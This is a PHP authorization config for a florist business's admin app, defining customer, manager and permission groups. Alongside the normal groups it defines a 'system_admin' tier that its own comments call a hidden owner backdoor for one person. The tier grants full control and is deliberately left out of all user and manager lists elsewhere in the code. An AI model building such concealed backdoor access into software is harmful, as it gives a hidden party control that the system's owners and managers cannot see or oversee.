<?php

declare(strict_types=1);

namespace Config;

use CodeIgniter\Shield\Config\AuthGroups as ShieldAuthGroups;

class AuthGroups extends ShieldAuthGroups
{
    // New self-registered users are CUSTOMERS (unused in admin app — all staff
    // are seeded via FbkAdminSeeder). Admin is granted explicitly.
    public string $defaultGroup = 'customer';

    public array $groups = [
        'customer' => [
            'title'       => 'Customer',
            'description' => 'A florist client. Placeholder — unused in this admin-only app.',
        ],
        'admin' => [
            'title'       => 'Manager',
            'description' => 'Flora by Klo staff/manager. Full access to clients, events, quotes, invoices, and reports.',
        ],
        // Hidden owner/backdoor tier (Jason). Full access; intentionally NOT
        // surfaced in any user/manager list — see fbk_admin_groups() +
        // fbk_hidden_group() and the user-list exclusion in the Users controller.
        'system_admin' => [
            'title'       => 'System Admin',
            'description' => 'Hidden owner/backdoor. Complete control; never shown in member, manager, or admin lists.',
        ],
    ];

    public array $permissions = [
        'admin.access'        => 'Can access the sites admin area',
        'admin.settings'      => 'Can access the main site settings',
        'users.manage-admins' => 'Can manage other admins',
        'users.create'        => 'Can create new non-admin users',
        'users.edit'          => 'Can edit existing non-admin users',
        'users.delete'        => 'Can delete existing non-admin users',
        'beta.access'         => 'Can access beta-level features',
    ];

    public array $matrix = [
        'system_admin' => [
            'admin.*',
            'users.*',
        ],
        'admin' => [
            'admin.*',
            'users.create',
            'users.edit',
        ],
    ];
}
